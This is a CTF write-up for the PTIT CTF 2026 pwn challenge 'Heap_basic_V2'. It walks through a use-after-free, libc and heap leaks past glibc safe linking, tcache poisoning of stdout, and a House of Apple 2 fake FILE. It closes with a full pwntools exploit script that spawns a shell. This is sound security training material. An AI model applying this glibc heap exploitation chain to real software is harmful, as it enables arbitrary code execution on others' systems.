---
title: "PTIT CTF 2026 - PWN challenge - Heap_basic_V2"
date: 2024-01-03 00:00:00 +0700
categories: [CTF, Heap Exploitation]
tags: [pwn, heap, uaf, house-of-apple, tcache, libc, ptit-ctf]
author: datious
---
# PTIT CTF 2026 - PWN challenge - Heap_basic_V2
Author: datious

![image](https://hackmd.io/_uploads/HkWdWq2wzl.png)

1. Heap_basic_V2.zip

![image](https://hackmd.io/_uploads/rJ2bM92DGe.png)

- The challenge provides four files:
    + chall (binary)
    + docker-compose 
    + Dockerfile
    + entrypoint.sh
- Based on Dockerfile we will get the libc file from ubuntu 22.04.

2. Analyzing and gathering 
- First, let's check the security mitigations.
![image](https://hackmd.io/_uploads/rkP4mq3vze.png)
-> Canary, NX, PIE, and RelRO are enabled. Fortify is disabled.
- The program runs like this:
```
─$ ./chall_patched 

== Heap Basic V2 ==
1. Create
2. Read
3. Edit
4. Delete
> Session closed

```
- There are four options:
    +1. Create: creates a chunk with a size provided by user.
    +2. Read: reads data from a previously created index.
    +3. Edit: modifies data from a previously created index.
    +4. Delete: frees a chunk. (This part is suspicious)
- Then, I analyze the decompiled binary in Ghidra to find vulnerabilities.
![image](https://hackmd.io/_uploads/rJvta53vMl.png)
- As suspected, this leads to a UAF vulnerability.
-> We can't overwrite any GOT address because the RelRO is full.
-> My idea is to use the House of Apple 2 technique to modify the stdout FILE object.

2. The strategy.
- For House of Apple 2 technique we need to leak some addresses from the program, such as: heap address, libc address.
- How to leak?
    + We can leak libc address (main_arena) from the unsorted bin (chunks size is 0x510 - include metadata size) when a chunk is freed. And we also leak heap address (chunks address) from the tcache bin (chunk's size from 0x110 to 0x410 - include metadata size).
    
```
chunk[0] - Create:chunk size(0x500) - Leak libc address
chunk[1] - Create: chunk size(0x200) - guard for avoid consolidatewith the top chunk
chunk[2] - Create: chunk size(0x100) - tcache poisoning
chunk[3] - Create: chunk size(0x100) - tcache poisoning
```    
- From the steps above, we have obtained the following addresses:
    + system address from libc leak
    + _IO_2_1_stdout_ address from libc leak
    + _IO_wfile_jumps address from libc leak
    + chunk addresses.
- How to calculate chunk addresses:
    + We leak heap address from chunk[2] and chunk[3].
```
Create chunk[2]
Create chunk[3]
Free chunk[3] - tcache bin->chunk[3]
Free chunk[2] - tache bin -> chunk[2] -> chunk[3] (LIFO)
```
- The freed chunks are managed by fd pointers.
- We can read that fd pointers by option 2 (Read).
- However, I realized that the fd pointer is encoded by glibc's safe linking.
- Example:
```
fd_encoded= (pos>>12)^next_chunk
chunk[3]-freed-fd3_encoded=(pos3>>12)^0(NULL)
pos3>>12=key3
-> key2=key3-1 (each page have an instance is 0x1000) -> key2=pos2>>12 = key3-1
=> chunk[3]_address=fd2_encoded^key2
```
=> So we now have all the necessary addresses for House of Apple technique.
- Building the fake stream for House of Apple 2 technique:
```
tcache poisoning fd2 = (chunk2>>12)^target(_IO_2_1_stdout_)
Create(4,0x100,b'c'*0x100) - get chunk[2] out of tcache
Create(5,0x100,bytes(fp)) fp is a fake frame for House of Apple 2
But before that we need to prepare a frame for wide_data(chunk1:0x200):
    +0xe0 - 0xe8: fake wide vtable (chunk1+0xf0)
    +0xf0+0x68 - 0xf0+0x70: p64(system) pointer function of wide_vtable
fake _IO_2_1_stdout_ FILE object:
    +0x00-0x04:b' sh;\x00'
    +0x20-0x28:0(write_base)
    +0x28-0x30:1(write-ptr)
    +0x88-0x90:stdout+0xf0(field cache)
    +0xa0-0xa8:wide_data
    +0xc0-0xc4:-1(_mode)
    +0xd8-0xe0:_IO_wfile_jumps
```

3. Script
solve.py
```
#!/usr/bin/python3
from pwn import *

exe=ELF('./chall_patched',checksec=False)
p=process(exe.path)
libc=ELF('libc.so.6',checksec=False)



#function
def create(index,size,data):
    p.sendlineafter(b'> ',str(1).encode())
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendlineafter(b'Size: ',str(size).encode())
    p.sendlineafter(b'Data: ',data)

def read_data(index):
    p.sendlineafter(b'> ',str(2).encode())
    p.sendlineafter(b'Index: ',str(index).encode())

def edit(index,data):
    p.sendlineafter(b'> ',str(3).encode())
    p.sendlineafter(b'Index: ',str(index).encode())
    p.sendlineafter(b'Data: ',data) 

def delete(index):
    p.sendlineafter(b'> ',str(4).encode())
    p.sendlineafter(b'Index: ',str(index).encode())


#leak libc
create(0,0x500,b'A'*0x500)#chunk0
create(1,0x200,b'B'*0x200)#chunk1 -> avoid consolidate with top chunk
create(2,0x100,b'C'*0x100)#tcache -> overwrite _IO_2_1_stdout 
create(3,0x100,b'D'*0x100)#make condition to set fd pointer in chunk3
delete(0)
read_data(0)
p.recvuntil(b'Data: ')
leak_libc=u64(p.recv(8))
libc.address=leak_libc-0x21ace0

log.info('leak libc: '+hex(leak_libc))
log.info("libc base: "+hex(libc.address))

system=libc.sym['system']
log.info("system: "+hex(system))

#heap address- determining chunks for exploit
delete(3)
delete(2)#head->chunk2>chunk3
read_data(3)#key3 key=(pos>>12)
p.recvuntil(b'Data: ')
key3=u64(p.recv(8))
read_data(2)#encoded_fd=(pos>>12)^chunk3
p.recvuntil(b'Data: ')
fd2_encoded=u64(p.recv(8))
#calculating addresses
key2=key3-1
chunk3=key2^fd2_encoded
chunk2=chunk3-0x110
chunk1=chunk2-0x210
#chunks infomation
log.info("chunk3: "+hex(chunk3))
log.info("chunk2: "+hex(chunk2))
log.info("chunk1: "+hex(chunk1))

stdout=libc.sym['_IO_2_1_stdout_']
wfile_jumps=libc.sym['_IO_wfile_jumps']
log.info("stdout address: "+hex(stdout))
log.info("wfile_jumps: "+hex(wfile_jumps))

#Building a fake _IO_wide_data
fake_wide_data=bytearray(0x200)
fake_wide_vtable=chunk1+0xf0
fake_wide_data[0xe0:0xe8]=p64(fake_wide_vtable)
fake_wide_data[0xf0+0x68:0xf0+0x70]=p64(system)

edit(1,fake_wide_data)

#tcache poisoning in fd of chunk2
target=stdout
fake_fd=(chunk2>>12)^target
edit(2,p64(fake_fd))

#Write house of apple 2 into _IO_2_1_stdout_
create(4,0x100,b'junk')#tcache->stout was poinsoned
cmd=b' sh;\x00'
fp=bytearray(0x100)
fp[0x00:len(cmd)]=cmd
fp[0x20:0x28]=p64(0)#write_base
fp[0x28:0x30]=p64(1)#write_ptr
fp[0x88:0x90]=p64(stdout+0xf0)#field phu
fp[0xa0:0xa8]=p64(chunk1)#wide_data_faked
fp[0xc0:0xc4]=p32(0xffffffff)#_mode
fp[0xd8:0xe0]=p64(wfile_jumps)

create(5,0x100,bytes(fp))
log.success("Successfully overwriten _IO_2_1_stdout_")

log.info("waiting for alarm activates shell (max=60s)")

p.interactive()
```
    

Goodluck!!!



